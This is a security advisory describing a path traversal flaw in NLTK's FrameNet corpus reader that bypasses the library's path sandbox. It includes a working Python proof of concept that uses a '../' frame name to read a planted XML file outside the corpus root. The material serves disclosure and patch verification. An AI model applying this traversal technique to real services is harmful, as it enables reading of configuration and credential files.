# [H] Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)

## Summary
Severity: High
Advisory: GHSA-xh95-f55m-82fw
CVE: CVE-2026-12074
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-xh95-f55m-82fw
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.10.0

## Details
### Summary
`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox — including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.


### Details
`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.

The same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:
- `doc()` — uses the index entry `filename` field
- the lexical-unit file loader — uses the `lexUnit` ID attribute

These are reachable through a malicious or attacker-modified FrameNet corpus index.

### PoC
```python
"""

import os
import sys
import tempfile
import warnings
from pathlib import Path

warnings.filterwarnings("ignore")

# --- Turn the documented strict sandbox ON, before importing the reader. ---
import nltk.pathsec as ps
ps.ENFORCE = True

import nltk
from nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError

FRAME_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<frame xmlns="http://framenet.icsi.berkeley.edu" ID="1337" name="pwned">\n'
    "<definition>SECRET-OUT-OF-ROOT-CONTENT</definition>\n"
    "</frame>\n"
)

BANNER = """\
===========================================================
 NLTK FramenetCorpusReader.frame() Path Traversal PoC
 nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}
===========================================================""".format(
    ver=nltk.__version__, enforce=ps.ENFORCE
)


def build_corpus():
    """Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root."""
    base = Path(tempfile.mkdtemp(prefix="fn_poc_"))
    root = base / "corpora" / "framenet"
    for d in ("frame", "fulltext", "lu"):
        (root / d).mkdir(parents=True)
    (root / "frameIndex.xml").write_text(
        '<?xml version="1.0"?><frameIndex></frameIndex>'
    )
    (root / "frRelation.xml").write_text(
        '<?xml version="1.0"?><frameRelations></frameRelations>'
    )

    # A frame-shaped XML file OUTSIDE the corpus root (the "sensitive" target).
    secret = base / "private"
    secret.mkdir()
    (secret / "secret.xml").write_text(FRAME_XML)

    return base, root, secret / "secret.xml"


def main():
    print(BANNER)
    base, root, secret_path = build_corpus()
    print(f"[*] corpus root : {root}")
    print(f"[*] secret file : {secret_path}  (OUTSIDE the root)\n")

    fn = FramenetCorpusReader(str(root), [])

    # Attacker-controlled frame name climbs out of <root>/frame/ up to <base>/private/secret.xml
    evil = os.path.join("..", "..", "..", "private", "secret")
    print(f"[*] calling   fn.frame({evil!r})")

    try:
        f = fn.frame(evil)
        definition = f["definition"]
        if "SECRET-OUT-OF-ROOT-CONTENT" in definition:
            print("\n  [VULN] out-of-root file was read and returned to caller")
            print(f"         frame name : {evil}")
            print(f"         frame ID   : {f['ID']}   name: {f['name']}")
            print(f"         definition : {definition}")
            print(f"\n  -> nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}")
            verdict = "VULNERABLE"
        else:
            print(f"\n  [?] frame() returned but content unexpected: {definition!r}")
            verdict = "INCONCLUSIVE"
    except FramenetError as e:
        # Patched build (#3581): _reject_unsafe_path_component raises before open().
        print(f"\n  [SAFE] FramenetError: {e}")
        print("         traversal rejected before any file was opened (patched)")
        verdict = "NOT VULNERABLE"
    except Exception as e:
        print(f"\n  [SAFE] {type(e).__name__}: {e}")
        verdict = "NOT VULNERABLE"

    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.
    print("\n[CONTROL] benign absent name should be 'Unknown frame':")
    try:
        fn.frame("Definitely_Not_A_Frame")
        print("  [?] unexpectedly succeeded")
    except Exception as e:
        print(f"  ok -> {type(e).__name__}: {e}")

    print("\n" + "=" * 59)
    print(f" Result: {verdict}  (ENFORCE = {ps.ENFORCE})")
    print("=" * 59)


if __name__ == "__main__":
    main()

```


### Impact
- **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.
- **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving "read any XML file the process can read." Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.
- **Silent bypass of an advertised boundary.** NLTK's `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read — silently, with no error or warning.
- **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.
- **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw
- https://github.com/nltk/nltk
